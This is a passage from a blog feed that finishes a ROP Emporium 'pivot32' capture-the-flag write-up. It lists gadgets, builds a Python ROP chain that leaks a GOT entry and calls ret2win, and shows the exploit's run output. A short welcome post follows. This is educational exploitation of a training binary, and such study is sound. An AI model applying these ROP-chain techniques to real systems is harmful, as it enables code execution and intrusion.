<p>To add offsets into registers and load data from memory, we need gadgets. Here are the gadgets used -</p>
<ol>
<li>
<p><code>pop ebx ; ret</code> - This is used to load a value from the top of the stack to <code>EBX</code>.</p>
</li>
<li>
<p><code>add eax, ebx ; ret</code> - This will add the value of <code>EBX</code> and <code>EAX</code> and store it in <code>EAX</code></p>
</li>
<li>
<p><code>mov eax, dword ptr [eax] ; ret</code> - This loads the value stored at the value in <code>EAX</code>. In simple terms, it uses the value in <code>EAX</code> as an address and the value at that address is moved into <code>EAX</code></p>
</li>
<li>
<p><code>call eax</code> - This will call the address in <code>EAX</code> (should be the address of a function)</p>
</li>
</ol>
<h3 id="building-the-rop-chain">Building the ROP chain</h3>
<p>Before building the ROP chain, the PLT and GOT entries of <code>foothold_function</code>, the various gadgets found and the offset are stored in variables.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># dynamically imported function - foothold_function</span>
foothold_plt <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x80485f0</span>)
foothold_got <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x804a024</span>)

<span style="color:#75715e"># gadgets</span>
<span style="color:#75715e"># pop eax ; ret</span>
pop_eax <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c0</span>)

<span style="color:#75715e"># call eax</span>
call_eax <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080486a3</span>)

<span style="color:#75715e"># mov eax, dword ptr [eax] ; ret</span>
eax_val <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c4</span>)

<span style="color:#75715e"># xchg eax, esp ; ret</span>
xchg <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c2</span>)

<span style="color:#75715e"># pop ebx ; ret</span>
pop_ebx <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08048571</span>)

<span style="color:#75715e"># add eax, ebx ; ret</span>
add <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080488c7</span>)

offset <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x1f7</span>)
</code></pre></div><p>The longer ROP chain is initialised with the PLT value of <code>foothold_function</code> since the first thing we need is to call this function to populate the GOT entry.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">=</span> foothold_plt
</code></pre></div><p>After this, the GOT entry contains the address of <code>foothold_function</code> in the memory. The <code>libpivot32.so</code> is brought into memory when required and assigned a starting memory address. First, the address of GOT entry is moved in <code>EAX</code> and then using the <code>mov eax, dword ptr [eax] ; ret</code> gadget, the address of the imported function is moved to <code>EAX</code>(saved at the GOT entry).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">+=</span> pop_eax
long <span style="color:#f92672">+=</span> foothold_got
long <span style="color:#f92672">+=</span> eax_val
</code></pre></div><p>The offset is moved to <code>EBX</code> and then added to <code>EAX</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">+=</span> pop_ebx
long <span style="color:#f92672">+=</span> offset
long <span style="color:#f92672">+=</span> add
</code></pre></div><p>Now <code>EAX</code> contains the address of <code>ret2win</code> function and it can be called.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">long <span style="color:#f92672">+=</span> call_eax
</code></pre></div><p>This solves the challenge and the flag is obtained. The complete <a href="https://github.com/saurabhmittal16/ropemporium/blob/master/pivot32.py">script</a> can be found in my Github <a href="https://github.com/saurabhmittal16/ropemporium">repo</a>.</p>
<p>Here is the output when the script is executed</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 exploit.py
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/saurabh/Data/Exploit/ropemporium/pivot/32/pivot32&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span style="color:#f92672">(</span>0x8048000<span style="color:#f92672">)</span>
    RPATH:    b<span style="color:#e6db74">&#39;./&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/home/saurabh/Data/Exploit/ropemporium/pivot/32/pivot32&#39;</span>: pid <span style="color:#ae81ff">28882</span>
Now kindly send your stack smash
&gt;
foothold_function<span style="color:#f92672">()</span>, check out my .got.plt entry to gain a foothold into libpivot.so
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ROPE<span style="color:#f92672">{</span>a_placeholder_32byte_flag!<span style="color:#f92672">}</span>
</code></pre></div><p>That&rsquo;s the end of this post. I think that this is a great challenge for beginners since the challenge is not too difficult but still interesting to work on. Thanks for reading. Cheers!</p>
]]></content>
        </item>
        
        <item>
            <title>First Post</title>
            <link>https://saurabhmittal16.github.io/posts/2020/03/first-post/</link>
            <pubDate>Sun, 08 Mar 2020 13:06:13 +0530</pubDate>
            
            <guid>https://saurabhmittal16.github.io/posts/2020/03/first-post/</guid>
            <description>Hello friend, welcome to my blog. I will use this blog for articles about projects I am working on or for CTF writeups of challenges</description>
            <content type="html"><![CDATA[<p>Hello friend, welcome to my blog. I will use this blog for articles about projects I am working on or for CTF writeups of challenges</p>
]]></content>
        </item>
        
    </channel>
</rss>
